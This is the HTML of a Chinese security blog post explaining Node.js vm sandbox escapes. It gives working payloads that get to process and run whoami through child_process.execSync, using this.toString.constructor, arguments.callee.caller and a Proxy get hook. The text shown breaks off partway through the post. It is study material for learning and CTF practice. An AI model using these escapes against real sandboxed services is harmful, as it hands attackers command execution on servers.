@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>nodejs VM和VM2沙箱逃逸 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/nodejs-vm/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="nodejs VM和VM2沙箱逃逸">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-26T19:44:34+00:00">
+    <meta property="article:modified_time" content="2024-03-26T19:44:34+00:00">
+    <meta property="article:tag" content="Node.js">
+    <meta property="article:tag" content="沙箱逃逸">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="nodejs VM和VM2沙箱逃逸">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/nodejs-vm/" /><link rel="prev" href="http://localhost:1313/posts/rdis/" /><link rel="next" href="http://localhost:1313/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "nodejs VM和VM2沙箱逃逸",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/nodejs-vm\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "node.js, 沙箱逃逸","wordcount":  5764 ,
+        "url": "http:\/\/localhost:1313\/posts\/nodejs-vm\/","datePublished": "2024-03-26T19:44:34+00:00","dateModified": "2024-03-26T19:44:34+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">nodejs VM和VM2沙箱逃逸</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞学习</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-26">2024-03-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 5764 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 12 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础概念">基础概念</a>
+      <ul>
+        <li><a href="#一">一、</a></li>
+        <li><a href="#二">二、</a></li>
+      </ul>
+    </li>
+    <li><a href="#vm沙箱逃逸">VM沙箱逃逸</a>
+      <ul>
+        <li><a href="#一-1">一、</a></li>
+        <li><a href="#二-1">二、</a>
+          <ul>
+            <li><a href="#1一般的vm沙箱逃逸">1：一般的VM沙箱逃逸</a></li>
+            <li><a href="#2其他vm沙箱逃逸">2：其他VM沙箱逃逸</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#vm2沙箱逃逸">VM2沙箱逃逸</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#cve-2019-10761">（CVE-2019-10761）</a></li>
+            <li><a href="#cve-2021-23449">（CVE-2021-23449）</a></li>
+            <li><a href="#hfctf2020justescape">（[HFCTF2020]JustEscape）</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#关键字绕过">关键字绕过</a>
+      <ul>
+        <li><a href="#一-2">一、</a>
+          <ul>
+            <li><a href="#116进制编码">1：16进制编码</a></li>
+            <li><a href="#2unicode编码">2：unicode编码</a></li>
+            <li><a href="#3加号拼接">3：加号拼接</a></li>
+            <li><a href="#4模板字符串拼接">4：模板字符串拼接</a></li>
+            <li><a href="#5concat连接">5：concat连接</a></li>
+            <li><a href="#6base64编码">6：base64编码</a></li>
+          </ul>
+        </li>
+        <li><a href="#二-2">二、</a>
+          <ul>
+            <li><a href="#1obejctkeys">1：Obejct.keys</a></li>
+            <li><a href="#2reflect">2：Reflect</a></li>
+            <li><a href="#3reflectget">3：<strong>Reflect</strong>.<strong>get</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#nkctf2024">NKCTF2024</a>
+      <ul>
+        <li><a href="#世界上最简单的ctf">世界上最简单的CTF</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>参考：https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLcxA2%3D7YRieD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</p>
+<p>参考：https://www.anquanke.com/post/id/237032#h3-4</p>
+<h2 id="基础概念">基础概念</h2>
+<h3 id="一">一、</h3>
+<p><strong>1：</strong><code>JavaScript</code>和<code>Nodejs</code>之间区别：<code>JavaScript</code>用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此写在后端（服务端）的<code>JavaScript</code>就叫叫做<code>Nodejs</code>。</p>
+<p>**2：**在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</p>
+<h3 id="二">二、</h3>
+<p>**nodejs作用域：**说到作用域，我们就要说一下<code>Node</code>中的作用域是怎么分配的（在<code>Node</code>中一般把作用域叫上下文）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png, https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png 1.5x, https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png"
+        title="https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png" />
+在JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）</p>
+<h2 id="vm沙箱逃逸">VM沙箱逃逸</h2>
+<h3 id="一-1">一、</h3>
+<p>关键函数：</p>
+<ul>
+<li>
+<p><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p>
+</li>
+<li>
+<p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。（类似于把global变为了其他包，V8引擎变为了全局）</p>
+</li>
+<li>
+<p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文（作用域）中执行，并且参数的值与沙箱内的参数值相同。</p>
+</li>
+</ul>
+<h3 id="二-1">二、</h3>
+<h4 id="1一般的vm沙箱逃逸">1：一般的VM沙箱逃逸</h4>
+<p>先看列子：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`m + n`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//反引号可以执行命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">m</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">n</span><span class="o">:</span> <span class="mi">2</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//给沙箱中传入对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//创建沙箱上下文环境并将沙箱对象传递进来
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//沙箱内部的执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span></span></span></code></pre></div></div><p>执行:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png, https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png 1.5x, https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png"
+        title="https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png" /></p>
+<p>这里命令是 `m+n` ，然后 context 是沙箱内的对象，如果对象改为 null 的话命令就执行不了了。</p>
+<p>这种有对象的非常容易绕过 payload：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">)()</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">通过指向sandbox</span><span class="err">（</span><span class="nx">全局</span><span class="err">）</span><span class="nx">的this拿到了process模块</span><span class="err">，</span><span class="nx">然后通过this</span><span class="p">.</span><span class="nx">toString拿到了toString函数</span><span class="err">，</span><span class="nx">最后通过constructor拿到了所有函数的构造函数Function</span><span class="err">，</span><span class="nx">然后通过return</span> <span class="nx">process拿到process模块</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cc</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">拿到process模块后拿到子模块child_process</span><span class="err">，</span><span class="nx">最后调用whoami命令执行的方法</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">execSync同步执行</span></span></span></code></pre></div></div><p>传入：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png, https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png 1.5x, https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png"
+        title="https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png" /></p>
+<p>运行即可执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png, https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png 1.5x, https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png"
+        title="https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png" /></p>
+<p>如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是<code>primitive</code>类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用（如果换为其他类型，如字典，数组就可以引用了）。</p>
+<h4 id="2其他vm沙箱逃逸">2：其他VM沙箱逃逸</h4>
+<hr>
+<p>示例1：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello &#39;</span> <span class="o">+</span> <span class="nx">res</span><span class="p">)</span></span></span></code></pre></div></div><p>可以看到这里沙箱对象变为了<code>null</code>，没有可以引用的对象，所以<code>this</code>的方法无法使用了。</p>
+<p>这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p>
+<p><strong>原理：</strong></p>
+<p>上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象（返回函数调用者），我们在沙箱内就可以进行逃逸了。</p>
+<p><strong>payload：</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">a</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})()</span></span></span></code></pre></div></div><p><strong>分析：</strong></p>
+<p>首先是创建了个箭头函数（为什么待会再说），再在函数里面创建了个对象a，给a对象创建了个toString方法（重写tostring方法）。重写的toString方法大概功能就是，给cc赋值为<code>arguments.callee.caller</code>获取的对象（类似于上面的this，就是获取个外部对对象），再拼接到p上，那么p的值就变为了<code>process</code>这个函数，再将p拼接到到最后，即可执行命令。（意思是可以直接全部拼接到一起）。最后箭头函数就是为了return  a这个对象（也就是执行结果）。</p>
+<p><code>arguments.callee.caller</code>之所以会返回个对像，是因为沙箱外console.log中通过字符串拼接的方式调用了这个重写后的toString函数，触发<code>arguments.callee.caller</code>函数功能。</p>
+<hr>
+<p>示例2：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">abc</span><span class="p">)</span></span></span></code></pre></div></div><p>没有了字符串拼接，但打印结果为<code>res.abc</code>，可以用<code>Proxy</code>来劫持属性：</p>
+<p>payload：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(()</span> <span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">})()</span></span></span></code></pre></div></div><p>分析：</p>
+<p>也是为了调用外部对象。触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p>
+<hr>
+<p>示例3：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
